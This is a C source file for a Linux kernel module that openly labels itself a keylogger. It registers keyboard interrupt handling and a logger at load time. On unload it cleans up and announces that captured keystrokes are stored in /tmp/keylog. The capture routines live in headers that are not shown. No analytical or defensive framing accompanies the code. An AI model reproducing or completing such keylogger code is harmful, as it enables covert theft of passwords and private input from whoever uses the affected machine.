// SPDX-License-Identifier: GPL-2.0
#include "keyboard.h"
#include "logger.h"
#define KBD_IRQ 1

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jbettini");
MODULE_DESCRIPTION("Keylogger");

static int __init entrypoint(void)
{
	int status = logger_init();
	if (status)
		return status;
	status = keyboard_init();
	if (status)
		return status;
	return 0;
}


static void __exit clean(void)
{
    free_irq(KBD_IRQ, &my_misc);
	input_unregister_device(kbd_input_dev);
	misc_deregister(&my_misc);
	logger_final_log();
	printk(KERN_INFO "Some Logs Here : /tmp/keylog =)\n");
	ft_lstclear(&inputs.inputs_lst, kfree);
	kfree(inputs.inputs_buffer);
	printk(KERN_INFO "Exiting: cleaning up module\n");
}

module_init(entrypoint);
module_exit(clean);